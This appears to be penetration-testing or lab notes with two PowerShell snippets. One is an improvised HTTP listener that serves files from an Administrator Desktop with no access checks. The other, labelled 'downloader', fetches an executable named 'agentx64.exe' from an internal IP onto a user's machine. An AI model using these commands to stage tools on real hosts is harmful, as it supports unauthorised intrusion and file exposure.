```
$root='C:\Users\Administrator\Desktop'; $listener=[Net.HttpListener]::new(); $listener.Prefixes.Add('http://+:8000/'); $listener.Start(); while($listener.IsListening){ $ctx=$listener.GetContext(); $req=$ctx.Request.RawUrl.Split('?')[0].TrimStart('/'); $file=Join-Path $root $req; if(Test-Path $file){ $b=[IO.File]::ReadAllBytes($file); $ctx.Response.ContentType='application/octet-stream'; $ctx.Response.ContentLength64=$b.Length; $ctx.Response.OutputStream.Write($b,0,$b.Length) } else { $ctx.Response.StatusCode=404 }; $ctx.Response.Close() }
```

downloader
```
Invoke-WebRequest -Uri 'http://10.10.161.141:8000/agentx64.exe' -OutFile 'C:\Users\celia.almeda\Documents\agentx64.exe'
```
